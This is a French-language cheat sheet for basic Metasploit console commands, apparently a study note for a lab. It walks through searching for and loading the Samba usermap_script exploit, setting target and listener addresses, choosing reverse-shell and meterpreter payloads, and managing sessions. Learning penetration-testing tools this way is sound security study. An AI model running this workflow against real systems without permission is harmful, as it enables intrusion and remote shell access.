# Metasploit — commandes de base

> Toutes les commandes ci-dessous s'exécutent dans **[Metasploit]** — c'est-à-dire dans `msfconsole`.

---

## Lancer Metasploit

```bash
# [Kali - terminal]
msfconsole
```

---

## Navigation et recherche

```bash
search samba                        # cherche tous les modules liés à samba
search cve:2007-2447                # cherche par numéro de CVE
search type:exploit samba           # cherche uniquement les exploits (pas les auxiliaires)
search samba rank:excellent         # filtre par fiabilité
info 15                             # affiche les détails du module numéro 15
info exploit/multi/samba/usermap_script  # idem avec le chemin complet
```

---

## Charger un module

```bash
use 15                                        # par numéro (issu du search)
use exploit/multi/samba/usermap_script        # par chemin complet (plus fiable)
```

---

## Configurer un module

```bash
show options          # affiche les options du module et ce qui est requis
set rhosts 192.168.1.1    # RHOSTS = Remote HOSTS = IP de la cible
set rport 445             # RPORT  = Remote PORT  = port de la cible
set lhost 192.168.1.2     # LHOST  = Local HOST   = ton IP (pour recevoir le shell)
set lport 4444            # LPORT  = Local PORT   = ton port d'écoute
show options              # vérifie que tout est bien configuré
```

---

## Lancer l'exploit

```bash
run       # lance l'exploit
exploit   # synonyme de run
check     # vérifie si la cible est vulnérable sans exploiter (si supporté)
```

---

## Types de modules

| Type | Rôle | Exemple |
|---|---|---|
| `exploit` | exploite une faille | `exploit/multi/samba/usermap_script` |
| `auxiliary` | reconnaissance, scan | `auxiliary/scanner/smb/smb_version` |
| `post` | actions après exploitation | `post/linux/gather/enum_configs` |
| `payload` | code exécuté sur la cible | `payload/cmd/unix/reverse_netcat` |

---

## Payloads

```bash
show payloads             # liste les payloads compatibles avec le module chargé
set payload cmd/unix/reverse_netcat   # choisir un payload
```

Les payloads les plus courants :

| Payload | Ce qu'il fait |
|---|---|
| `cmd/unix/reverse_netcat` | shell inversé via netcat |
| `cmd/unix/bind_netcat` | shell en écoute sur la cible |
| `linux/x86/meterpreter/reverse_tcp` | meterpreter (shell avancé) |

---

## Dans un shell ou meterpreter

```bash
whoami          # qui suis-je sur la machine distante
id              # groupes et uid
uname -a        # version du kernel
hostname        # nom de la machine
background      # met la session en arrière-plan
sessions -l     # liste toutes les sessions ouvertes
sessions -i 1   # reprend la session numéro 1
exit            # quitte la session
```

---

## Divers

```bash
back              # quitte le module chargé, retourne au prompt msf6
help              # affiche l'aide
history           # historique des commandes
exit              # quitte msfconsole
```

---

## Workflow type

```
[Kali]       nmap -sV IP              → trouver service + version
[Kali]       searchsploit service ver → trouver l'exploit
[Metasploit] search service           → trouver le module
[Metasploit] use <module>             → charger le module
[Metasploit] show options             → voir ce qu'il faut configurer
[Metasploit] set rhosts IP            → configurer la cible
[Metasploit] run                      → exploiter
```